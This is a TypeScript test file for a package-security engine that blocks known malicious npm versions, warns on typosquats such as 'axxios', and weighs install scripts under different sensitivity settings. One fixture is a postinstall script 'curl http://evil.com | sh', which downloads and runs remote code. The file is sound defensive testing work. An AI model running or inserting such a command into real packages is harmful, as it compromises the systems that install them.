import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { LocalEngine } from './index';
import path from 'path';
import fs from 'fs';
import os from 'os';

describe('LocalEngine', () => {
  let engine: LocalEngine;
  let dbPath: string;

  beforeEach(() => {
    dbPath = path.join(os.tmpdir(), `ward-engine-test-${Date.now()}.db`);
    engine = new LocalEngine({
      dbPath,
      topPackages: ['axios', 'lodash', 'express', 'react', 'next'],
    });

    // Seed a known threat
    engine.seedThreat({
      package_name: 'axios',
      version: '1.14.1',
      threat_type: 'malicious-code',
      description: 'This version steals SSH keys and cloud credentials',
      safe_version: '1.14.0',
      detected_at: '2026-03-31T00:00:00Z',
    });
  });

  afterEach(() => {
    engine.close();
    try { fs.unlinkSync(dbPath); } catch {}
    try { fs.unlinkSync(dbPath + '-wal'); } catch {}
    try { fs.unlinkSync(dbPath + '-shm'); } catch {}
  });

  // Integration tests — engine combines all checks

  it('blocks a known malicious package', () => {
    const verdict = engine.check({ name: 'axios', version: '1.14.1' });
    expect(verdict.action).toBe('block');
    expect(verdict.explanation).toContain('SSH keys');
    expect(verdict.safeVersion).toBe('1.14.0');
  });

  it('warns on typosquat', () => {
    const verdict = engine.check({ name: 'axxios', version: '1.0.0' });
    expect(verdict.action).toBe('warn');
    expect(verdict.signals.some(s => s.type === 'typosquat')).toBe(true);
  });

  it('allows a clean package', () => {
    const verdict = engine.check({ name: 'express', version: '4.19.0' });
    expect(verdict.action).toBe('allow');
    expect(verdict.summary).toBe('clean');
  });

  it('combines signals from multiple checks', () => {
    // axxios is a typosquat AND could have install scripts
    const verdict = engine.check({
      name: 'axxios',
      version: '1.0.0',
      scripts: { postinstall: 'curl http://evil.com | sh' },
    });
    expect(verdict.action).toBe('warn');
    expect(verdict.signals.length).toBeGreaterThanOrEqual(2);
  });

  it('known threat overrides all other signals', () => {
    const verdict = engine.check({
      name: 'axios',
      version: '1.14.1',
      scripts: { postinstall: 'node steal.js' },
    });
    expect(verdict.action).toBe('block');
  });

  it('returns allow for packages in the allowlist', () => {
    const allowDbPath = dbPath + '-allow';
    const allowEngine = new LocalEngine({
      dbPath: allowDbPath,
      topPackages: ['axios'],
      config: { sensitivity: 'normal', allowlist: ['axios'], cloudEnabled: false },
    });
    allowEngine.seedThreat({
      package_name: 'axios',
      version: '1.14.1',
      threat_type: 'malicious-code',
      description: 'test',
      detected_at: '2026-01-01T00:00:00Z',
    });

    const verdict = allowEngine.check({ name: 'axios', version: '1.14.1' });
    expect(verdict.action).toBe('allow');
    allowEngine.close();
    try { fs.unlinkSync(allowDbPath); } catch {}
  });

  it('respects strict sensitivity (install scripts → block)', () => {
    const strictDbPath = dbPath + '-strict';
    const strictEngine = new LocalEngine({
      dbPath: strictDbPath,
      topPackages: [],
      config: { sensitivity: 'strict', allowlist: [], cloudEnabled: false },
    });
    const verdict = strictEngine.check({
      name: 'some-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'node mystery.js' },
    });
    expect(verdict.action).toBe('block');
    strictEngine.close();
    try { fs.unlinkSync(strictDbPath); } catch {}
  });

  it('respects permissive sensitivity (typosquat → allow)', () => {
    const permDbPath = dbPath + '-perm';
    const permEngine = new LocalEngine({
      dbPath: permDbPath,
      topPackages: ['axios'],
      config: { sensitivity: 'permissive', allowlist: [], cloudEnabled: false },
    });
    const verdict = permEngine.check({ name: 'axxios', version: '1.0.0' });
    // Permissive: warnings become info, only blocks stop installs
    expect(verdict.action).toBe('allow');
    permEngine.close();
    try { fs.unlinkSync(permDbPath); } catch {}
  });

  it('handles check with minimal info (name + version only)', () => {
    const verdict = engine.check({ name: 'unknown-pkg', version: '1.0.0' });
    expect(verdict.action).toBe('allow');
  });
});
